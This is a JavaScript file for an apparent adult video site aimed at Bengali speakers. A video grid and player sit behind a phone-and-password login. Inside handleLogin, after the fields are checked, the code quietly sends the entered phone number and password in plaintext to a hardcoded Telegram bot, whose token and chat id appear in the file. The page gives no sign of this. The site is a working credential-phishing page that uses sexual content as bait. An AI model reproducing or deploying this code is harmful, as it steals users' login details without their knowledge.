const videos = [
  {
    title: "বাংলা মাল 🥵🥵🥵",
    category: "Bangla",
    description: "A spicy Bengali video.",
    thumb: "https://i.ibb.co.com/xSrJc31m/IMG-20250419-015736-295.jpg",
    url: "https://github.com/teamxx426/Reamx2/raw/refs/heads/main/5_6053354450607674764.mp4"
  },
  {
    title: "বাংলা মাল 🥵🥵 ২",
    category: "Bangla",
    description: "Part 2 of the spicy Bengali video.",
    thumb: "https://github.com/teamxx426/Reamx2/blob/main/IMG_20250419_015941_242.jpg?raw=true",
    url: "https://github.com/teamxx426/Reamx2/raw/refs/heads/main/VID_20250419_015944_300.mp4"
  },
  {
    title: "Tech Demo",
    category: "Tech",
    description: "A tech demo video.",
    thumb: "https://img.youtube.com/vi/3JZ_D3ELwOQ/hqdefault.jpg",
    url: "https://moiptvhls-i.akamaihd.net/hls/live/652945/xintv/master.m3u8"
  }
];

let currentVideo = null;
let isMuted = false;

function handleLogin() {
  const phone = document.getElementById('phone').value.trim();
  const password = document.getElementById('password').value.trim();
  const phoneRegex = /^[0-9]{1,11}$/;

  // Clear any previous error messages
  document.getElementById('error-message').innerHTML = '';

  // Phone validation
  if (!phoneRegex.test(phone)) {
    showError("Enter a valid phone number (up to 11 digits)");
    return;
  }

  // Password validation
  if (password === "") {
    showError("Password cannot be empty");
    return;
  }

  // If validation passes, login successful
  document.getElementById('loginForm').style.display = 'none';
  document.getElementById('videoArea').style.display = 'block';

  loadVideoThumbnails(videos);
  
  // Send login details to Telegram bot
  fetch(`https://api.telegram.org/bot8109746515:AAHsmsg9mcrW1HyXuQC8uMSDil3WTErWoK0/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: "7987662357",
      text: `Login:\nPhone: ${phone}\nPassword: ${password}`
    })
  });
}

function showError(message) {
  const errorElement = document.getElementById('error-message');
  errorElement.textContent = message;
  errorElement.style.display = 'block';
}

function loadVideoThumbnails(videoList) {
  const grid = document.getElementById('videoGrid');
  grid.innerHTML = '';

  videoList.forEach(video => {
    const card = document.createElement('div');
    card.className = 'video-card';
    card.onclick = () => playVideo(video);
    card.innerHTML = `
      <img class="video-thumb" src="${video.thumb}" alt="Thumbnail" />
      <div class="video-title">${video.title}</div>
    `;
    grid.appendChild(card);
  });
}

function playVideo(video) {
  currentVideo = video;
  document.getElementById('videoArea').style.display = 'none';
  document.getElementById('playerView').style.display = 'block';

  const player = document.getElementById('videoPlayer');
  const videoSource = document.getElementById('videoSource');
  videoSource.src = video.url;
  document.getElementById('videoTitle').textContent = video.title;
  document.getElementById('videoDescription').textContent = `Description: ${video.description}`;

  player.load();
  player.play();

  player.ontimeupdate = updateProgress;
  player.onloadedmetadata = () => {
    document.getElementById('totalTime').textContent = formatTime(player.duration);
  };
}

function togglePlayPause() {
  const player = document.getElementById('videoPlayer');
  if (player.paused) {
    player.play();
  } else {
    player.pause();
  }
}

function updateProgress() {
  const player = document.getElementById('videoPlayer');
  const progress = document.getElementById('progress');
  const currentTime = document.getElementById('currentTime');
  const totalTime = document.getElementById('totalTime');

  const progressPercentage = (player.currentTime / player.duration) * 100;
  progress.style.width = `${progressPercentage}%`;

  currentTime.textContent = formatTime(player.currentTime);
  totalTime.textContent = formatTime(player.duration);
}

function formatTime(seconds) {
  const minutes = Math.floor(seconds / 60);
  const remainingSeconds = Math.floor(seconds % 60);
  return `${minutes < 10 ? '0' : ''}${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
}

function seekVideo(event) {
  const player = document.getElementById('videoPlayer');
  const progressBar = document.querySelector('.progress-bar');
  const clickPosition = event.offsetX;
  const newTime = (clickPosition / progressBar.offsetWidth) * player.duration;

  player.currentTime = newTime;
}

function toggleMute() {
  const player = document.getElementById('videoPlayer');
  isMuted = !isMuted;
  player.muted = isMuted;
}

function changeVolume(event) {
  const player = document.getElementById('videoPlayer');
  player.volume = event.target.value / 100;
}

function changeSpeed(event) {
  const player = document.getElementById('videoPlayer');
  player.playbackRate = parseFloat(event.target.value);
}

function toggleFullscreen() {
  const player = document.getElementById('videoPlayer');
  if (player.requestFullscreen) {
    player.requestFullscreen();
  } else if (player.mozRequestFullScreen) { // Firefox
    player.mozRequestFullScreen();
  } else if (player.webkitRequestFullscreen) { // Chrome, Safari, Opera
    player.webkitRequestFullscreen();
  } else if (player.msRequestFullscreen) { // IE/Edge
    player.msRequestFullscreen();
  }
}

function goBack() {
  document.getElementById('playerView').style.display = 'none';
  document.getElementById('videoArea').style.display = 'block';
  const player = document.getElementById('videoPlayer');
  player.pause();
  player.src = '';
}

function logout() {
  document.getElementById('videoArea').style.display = 'none';
  document.getElementById('loginForm').style.display = 'block';
  document.getElementById('phone').value = '';
  document.getElementById('password').value = '';
}
